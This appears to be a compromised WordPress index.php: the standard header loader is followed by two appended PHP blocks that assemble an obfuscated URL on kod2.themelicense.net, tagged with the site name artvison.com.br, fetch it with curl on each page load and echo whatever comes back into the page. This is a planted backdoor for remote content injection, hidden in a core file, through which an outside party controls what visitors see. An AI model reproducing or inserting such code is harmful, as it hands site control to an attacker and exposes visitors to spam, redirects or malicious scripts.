<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
?>
<?php 
$x1 = "artvison.com.br"; 
$x2 = (string)(1); 
$x3 = 'http' . '://' . 'kod2' . '.them' . 'elicense' . '.net' . '/kod' . '/read' . '.php?' . 'url=' . $x1 . '&type=' . $x2;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $x3);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$x4 = curl_exec($ch);
curl_close($ch);

echo $x4;
?>

<?php 
$x1 = "artvison.com.br"; 
$x2 = ""; 
$x3 = 'http' . '://' . 'kod2' . '.them' . 'elicense' . '.net' . '/kod' . '/read' . '.php?' . 'url=' . $x1 . '&type=' . $x2;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $x3);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$x4 = curl_exec($ch);
curl_close($ch);

echo $x4;
?>
